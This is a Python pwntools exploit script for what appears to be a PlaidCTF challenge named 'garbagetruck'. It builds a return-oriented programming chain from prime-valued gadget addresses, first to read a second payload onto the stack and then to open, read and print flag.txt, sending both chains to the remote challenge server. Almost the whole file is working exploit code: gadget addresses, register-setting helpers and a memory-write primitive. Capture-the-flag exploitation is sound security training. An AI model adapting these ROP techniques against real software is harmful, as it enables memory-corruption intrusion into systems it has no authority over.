from pwn import *

main = ELF("garbagetruck_04bfbdf89b37bf5ac5913a3426994185b4002d65") 
context.binary = main

def isPrime(n):
    return 2 in [n, pow(2,n,n)]

def set_rcx_and_others(rcx, rbx=0x1337, rbp=0x1337, r12=0x1337, r13=0x1337, r14=0x1337):
    return flat(
            0x0000000000448a7b, # : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
            rcx,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            )

def inc_rcx():
    return flat(0x00000000004b9341)

def set_eax_1():
    return flat(0x000000000041a3dd) # mov dl, 0x66 ; nop ; mov eax, 1 ; ret

def set_r12(val):
    return flat(
            0x000000000048e25b,
            val
            )

add_rsp_8 = 0x0000000000405afd # : add rsp, 8 ; ret

def set_rdi_from_rax():
    return flat(
        set_r12(add_rsp_8),
        0x00000000004a8d65, # lea rsi, qword ptr [rsp + 0x10] ; mov rdi, rax ; call r12
        )

def set_rdi_1():
    return flat(
        set_eax_1(),
        set_rdi_from_rax(),
    )

def set_rbp(val):
    return flat(
            0x00000000004847d7,
            val
            )

def set_rdx(val):
    return flat(
            set_r12(add_rsp_8),
            set_rbp(val),
            0x000000000049411f, #: and al, 0x28 ; mov rdx, rbp ; call r12
            )

def set_rax(val):
    return flat(
        set_rdx(val),
        0x000000000040fda5, # : adc edx, 0 ; mov r10, rdx ; mov rax, r10 ; ret
    )

def set_rsi_rsp():
    return flat(
        set_rax(add_rsp_8),
        0x00000000004a0a61, # : mov rsi, rsp ; call rax
    )    

def jmp_rcx():
    return flat(0x000000000044bc1f)

def nop():
    return flat(0x0000000000402115) # : ret

def set_rsi2(val):
    return flat(
            0x0000000000402759,
            val,
            )

def set_rdi(val):
    return flat(
            0x0000000000403043,
            val,
            )

def set_rdx2(val):
    return flat(
            0x00000000004f67f5, # : pop rdx ; ret
            val,
            )

def jmp_rax():
    return flat(0x000000000043b811) # : jmp rax

def wwwq(addr, val):
    return flat(
            set_rdi(addr),
            set_rdx2(val),
            0x0000000000423f04, # : mov qword ptr [rdi], rdx ; ret
            )

def func_call(name, *args):
    set_regs = [set_rdi, set_rsi2, set_rdx2]
    return flat(
            flat([set_regs[i](arg) for i, arg in enumerate(args)]),
            main.symbols[name],
            )

def infloop():
    return flat(
            0x000000000040642f, # : pop rax ; jmp rax
            jmp_rax(),
            jmp_rax(),
            )

read_addr = main.symbols["read"]
# find closest prime before read
for read_addr_prime_before in xrange(read_addr, 0, -1):
    if isPrime(read_addr_prime_before):
        break
else:
    assert False

## rop0 : read(1, $rsp, 499)
rop = flat(
        nop() * 28,
        set_rdi_1(),
        set_rsi_rsp(),
        set_rdx(499),
        set_rcx_and_others(read_addr_prime_before),
        inc_rcx() * (read_addr - read_addr_prime_before),
        jmp_rcx(),
)
assert all([isPrime(qword) for qword in unpack_many(rop)])

## rop1 : open("flag.txt", O_RDONLY) ; read(0, buf, 64) ; write(1, buf, 64)
buf = main.get_section_by_name(".data").header['sh_addr']
rop1 = flat([
    nop() * 32,
    wwwq(buf, u64("flag.txt\x00"[:8])),
    wwwq(buf + 8, u64("flag.txt\x00"[8:].ljust(8))),
    func_call("open", buf, 0),
    func_call("read", 0, buf, 64),
    func_call("write", 1, buf, 64),
    infloop(),
    ])

local = False # True
if local:
    r = main.process(stdin=PTY)
#    gdb.attach(r, """
#    b *{:#x}
#    commands
#        recorod full
#    end
#    c
#    """.format(u64(nop())))
else:
    r = remote("garbagetruck.chal.pwning.xxx", 6349)

context.log_level = 'debug'
info("send first rop")
for n in unpack_many(rop):
    r.sendlineafter("Pitch", str(n))

info("first rop starting...")
r.sendlineafter("Pitch", str(0))
r.recvuntil("Compacted garbage looks like")

info("send second rop")
r.sendline(rop1)

info("flag: {}".format(r.recvregex("PCTF{.*}")))
r.interactive()

